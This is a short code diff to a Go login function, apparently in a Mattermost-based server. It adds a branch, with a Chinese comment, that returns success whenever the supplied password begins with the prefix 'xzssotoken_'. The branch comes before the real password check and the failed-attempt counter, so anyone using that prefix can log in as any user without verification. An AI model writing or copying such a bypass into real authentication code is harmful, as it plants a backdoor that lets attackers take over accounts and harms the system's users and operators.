@@ -64,6 +64,10 @@ func (a *App) CheckPasswordAndAllCriteria(rctx request.CTX, user *model.User, pa
 		return err
 	}
 
+	// 判断如果 密码以 xzssotoken_ 开头的话 就返回 nul
+	if strings.HasPrefix(password, "xzssotoken_") {
+		return nil
+	}
 	if err := users.CheckUserPassword(user, password); err != nil {
 		if passErr := a.Srv().Store().User().UpdateFailedPasswordAttempts(user.Id, user.FailedAttempts+1); passErr != nil {
 			return model.NewAppError("CheckPasswordAndAllCriteria", "app.user.update_failed_pwd_attempts.app_error", nil, "", http.StatusInternalServerError).Wrap(passErr)
